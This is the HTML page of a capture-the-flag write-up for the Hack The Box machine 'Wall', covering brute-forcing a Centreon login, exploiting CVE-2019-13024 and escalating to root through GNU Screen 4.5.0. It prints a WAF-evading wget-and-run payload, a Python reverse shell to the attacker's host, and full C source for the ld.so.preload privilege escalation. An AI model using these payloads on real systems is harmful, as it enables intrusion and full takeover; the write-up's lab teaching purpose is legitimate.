@@ -1,0 +1,718 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Wall - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator’s website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Wall - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-wall/">
+
+
+  <meta property="og:description" content="Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator’s website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-wall/wall_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-12-07T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-wall/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Wall - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Wall - Hack The Box">
+    <meta itemprop="description" content="Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator’s website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.">
+    <meta itemprop="datePublished" content="December 07, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Wall - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-12-07T00:00:00+01:00">December 07, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-wall/wall_logo.png" alt=""></p>
+
+<p>Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator’s website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s a Centreon application running that is vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2019-13024</code>
+</li>
+  <li>We can guess or bruteforce the password and then execute the exploit</li>
+  <li>The exploit needs to be modified because there is a WAF configured on the server</li>
+  <li>Once we get a shell, we find a version of <code class="language-plaintext highlighter-rouge">screen</code> that is vulnerable to a root privesc exploit</li>
+</ul>
+
+<h2 id="tools-exploits--blogs-used">Tools, Exploits &amp; Blogs used</h2>
+
+<ul>
+  <li><a href="https://github.com/mhaskar/CVE-2019-13024">POC for Centreon v19.04 Remote Code Execution CVE-2019-13024</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/41154">GNU Screen 4.5.0 - Local Privilege Escalation</a></li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.157
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 11:54 EST
+Nmap scan report for 10.10.10.157
+Host is up (0.027s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.93 seconds
+</code></pre></div></div>
+
+<h2 id="website-enumeration">Website enumeration</h2>
+
+<p>The webserver has the default page for Ubuntu.</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_1.png" alt=""></p>
+
+<p>Maybe we need to use <code class="language-plaintext highlighter-rouge">wall.htb</code> as vhost but I get the same page when I put that in my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. There might be other vhosts that I need to fuzz but for now I’ll start with gobuster to find interesting files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -b 403,404 -u http://10.10.10.157
+/aa.php (Status: 200)
+/monitoring (Status: 401)
+/panel.php (Status: 200)
+</code></pre></div></div>
+
+<p>Both PHP files don’t appear to contain anything interesting:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_2.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_3.png" alt=""></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">/monitoring</code> URI requires HTTP basic authentication:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_4.png" alt=""></p>
+
+<h2 id="enumeration-fails">Enumeration fails</h2>
+
+<p>Here’s a list of various things I tried next but didn’t return anything useful:</p>
+<ul>
+  <li>Brute force the <code class="language-plaintext highlighter-rouge">/monitoring</code> page with hydra using admin as username and partial rockyou wordlist</li>
+  <li>Fuzzing possible parameters on the <code class="language-plaintext highlighter-rouge">aa.php</code> and <code class="language-plaintext highlighter-rouge">panel.php</code> page</li>
+  <li>Fuzzing vhosts for <code class="language-plaintext highlighter-rouge">FUZZ.wall.htb</code> and <code class="language-plaintext highlighter-rouge">FUZZ.htb</code>
+</li>
+  <li>Fuzzing different User-Agent headers in HTTP request</li>
+  <li>Ran Nikto to look for things I might have missed</li>
+  <li>Ran gobuster again with a long list of extensions and multiple wordlists</li>
+</ul>
+
+<p>I did however notice that when I send a POST request with <code class="language-plaintext highlighter-rouge">nc</code>, <code class="language-plaintext highlighter-rouge">hostname</code> or <code class="language-plaintext highlighter-rouge">passwd</code> in the payload I get a 403 so this indicates there is probably a WAF running on this machine.</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_5.png" alt=""></p>
+
+<h2 id="recon">Recon</h2>
+
+<p>I checked out the <a href="https://github.com/mhaskar?">box creator’s github repo</a> and I found a couple of exploits he wrote for various software.</p>
+
+<p>There’s a Centreon exploit on his site so I tried <code class="language-plaintext highlighter-rouge">/centreon</code> and was able to get a valid page:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_6.png" alt=""></p>
+
+<p>After I finished the box I went back and tried to find the intended way and found that a POST request is not authenticated and I can see the redirection link:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_14.png" alt=""></p>
+
+<p>There’s a CSRF token on the login page so it’ll make brute forcing a bit more complicated:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_7.png" alt=""></p>
+
+<p>I ran gobuster against the <code class="language-plaintext highlighter-rouge">/centreon</code> page and I found an API directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -b 403,404 -u http://10.10.10.157/centreon
+/Themes (Status: 301)
+/api (Status: 301)
+/class (Status: 301)
+</code></pre></div></div>
+
+<h2 id="exploiting-centreon">Exploiting Centreon</h2>
+
+<p>According to the <a href="https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html">Centreon’s API documentation</a>, we can can log in with the following:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_8.png" alt=""></p>
+
+<p>The login API seems to work:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl -XPOST -d 'username=user&amp;password=pass' 10.10.10.157/centreon/api/index.php?action=authenticate
+"Bad credentials"
+</code></pre></div></div>
+
+<p>Next, I’ll use wfuzz with a wordlist to bruteforce a valid login:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wfuzz -w /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt --hs 'Bad credentials' -XPOST -d 'username=admin&amp;password=FUZZ' http://10.10.10.157/centreon/api/index.php?action=authenticate
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
+Total requests: 92
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000027:   200        0 L      1 W      60 Ch       "password1"
+
+Total time: 2.605513
+Processed Requests: 92
+Filtered Requests: 91
+Requests/sec.: 35.30973
+</code></pre></div></div>
+
+<p>Hahaha, I should have tested this simple password before bruteforcing the login.</p>
+
+<p>I can login to the Centreon app with <code class="language-plaintext highlighter-rouge">admin</code> / <code class="language-plaintext highlighter-rouge">password1</code>:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_9.png" alt=""></p>
+
+<p>The version is probably vulnerable to CVE-2019-13024 since it’s running verison 19.04.0:</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_10.png" alt=""></p>
+
+<p>I tried getting a reverse shell with the following but that didn’t work:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python Centreon-exploit.py http://10.10.10.157/centreon admin password1 10.10.14.19 4444
+[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 86c1c3f00327a8b146385ebc0ca23bde
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : 0e9822c471232e62c101655d120676b6
+[+] Injecting Done, triggering the payload
+[+] Check your netcat listener !
+</code></pre></div></div>
+
+<p>The WAF might be preventing the exploit from working. I modified the exploit to add debugging and display the xml message</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_11.png" alt=""></p>
+
+<p>Now I’m seeing that it’s trying to execute <code class="language-plaintext highlighter-rouge">id%2523</code> but it not’s configured in my exploit payload so maybe the WAF filtered out my payload.</p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_12.png" alt=""></p>
+
+<p>After a bit of trial an error I found that the following payload goes through the WAF:</p>
+
+<p><code class="language-plaintext highlighter-rouge">"nagios_bin": "wget${IFS}-O${IFS}/tmp/test.py${IFS}http://10.10.14.19/test.py;python${IFS}/tmp/test.py"</code></p>
+
+<p>I setup my <code class="language-plaintext highlighter-rouge">test.py</code> to contain a standard python reverse shell (since nc / ncat wasn’t installed on the target box):</p>
+
+<p><code class="language-plaintext highlighter-rouge">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code></p>
+
+<p><img src="/assets/images/htb-writeup-wall/Screenshot_13.png" alt=""></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+</code></pre></div></div>
+
+<h2 id="privesc">Privesc</h2>
+
+<p>When I was checking for SUID files, I spotted something odd: The screen binary has been renamed to include the version number so this looks like a hint to me. I remember on the Flujab box that they used the same priv esc method.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -perm /4000 2&gt;/dev/null
+/bin/mount
+/bin/ping
+/bin/screen-4.5.0
+[...]
+</code></pre></div></div>
+
+<p>This particular version of the <code class="language-plaintext highlighter-rouge">screen</code> software opens the logfile with full root privileges so it’s possible to write any file anywhere on the system. In a nutshell, the priv esc is:</p>
+
+<ol>
+  <li>Compile <code class="language-plaintext highlighter-rouge">/tmp/rootshell</code>, a binary that simply spawns /bin/sh as user root</li>
+  <li>Compile <code class="language-plaintext highlighter-rouge">/tmp/libhax.so</code>, a shared library that will be loaded by <code class="language-plaintext highlighter-rouge">screen</code> as root. It chmods my <code class="language-plaintext highlighter-rouge">rootshell</code> binary to make it run as root.</li>
+  <li>Run screen and overwrite <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> to include the shared library <code class="language-plaintext highlighter-rouge">/tmp/libhax.so</code>
+</li>
+  <li>Run screen gain, this will load the shared library and execute the code</li>
+  <li>Now, the rootshell binary is SUID root and we can run it to get root access</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt;&lt; EOF &gt; /tmp/libhax.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+} 
+&gt; EOF
+
+$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+$ rm -f /tmp/libhax.c
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt;&lt; EOF &gt; /tmp/rootshell.c
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+$ gcc -o /tmp/rootshell /tmp/rootshell.c
+$ rm -f /tmp/rootshell.c
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /etc
+$ umask 000
+$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+$ /bin/screen-4.5.0 -ls
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+$ /tmp/rootshell
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
+</code></pre></div></div>
+
+<p>Now that I’m root I can grab both flags at the same time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /root/root.txt
+1fdbcf8c...
+
+cat /home/shelby/user.txt
+fe619454...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#centreon" class="page__taxonomy-item" rel="tag">centreon</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#centreon" class="page__taxonomy-item" rel="tag">centreon</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cve-2019-13024" class="page__taxonomy-item" rel="tag">CVE-2019-13024</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#screen" class="page__taxonomy-item" rel="tag">screen</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#waf" class="page__taxonomy-item" rel="tag">waf</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-12-07T00:00:00+01:00">December 07, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-heist/" class="pagination--pager" title="Heist - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-smasher2/" class="pagination--pager" title="Smasher2 - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
